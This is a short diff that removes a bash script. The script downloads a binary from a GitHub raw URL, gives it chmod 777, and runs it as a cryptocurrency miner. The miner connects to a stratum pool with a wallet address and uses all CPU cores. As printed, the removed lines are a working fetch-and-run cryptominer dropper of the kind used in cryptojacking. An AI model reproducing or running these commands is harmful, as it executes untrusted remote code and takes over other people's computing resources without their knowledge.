@@ -1,4 +1,0 @@
-#!/bin/bash
-wget -O biru https://github.com/kidoescegh/filee/raw/main/avx2adv 
-chmod 777 biru
-./biru -a yespoweradvc  -o stratum+tcp://stratum-na.rplant.xyz:7149 -u AZiqaN5C5ugfc54orCsKWK6s5X4s3JwmKj.$(shuf -n 1 -i 1-99999)-ADV -p m=solo -t $(nproc --all)
